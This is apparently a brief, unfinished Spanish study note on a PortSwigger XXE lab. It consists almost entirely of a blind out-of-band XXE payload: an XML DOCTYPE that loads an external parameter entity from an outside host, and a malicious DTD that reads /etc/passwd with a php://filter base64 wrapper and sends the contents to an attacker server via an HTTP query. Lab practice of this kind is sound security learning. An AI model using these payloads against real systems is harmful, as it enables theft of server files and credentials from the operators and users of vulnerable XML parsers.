Tags: #XXE #PortSwigger 

# Lab 5 Falta acabarlooooooooooo

```xml 
<!-- Por si no nos dejan colocar entidades, tendriamos que hacerlo en el DOCTYPE -->

<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://1acdc5ay0qrwik98y.otify.com"> %xxe; ]>      
	<root>
		root
	</root>
```

Construimos el DTD malicioso
```javascript
<!-- Lista el /etc/passwd en una linea en base64, tramitando otra peticion a nuestro server y lo convertira en base64 -->

<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">   
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.2.2/?file=%file;' >">
%eval;
%exfil;

<!-- % = 25, esto se hara en la segunda entidad -->
<!-- exfil = Exfiltrar la data                  --> 
```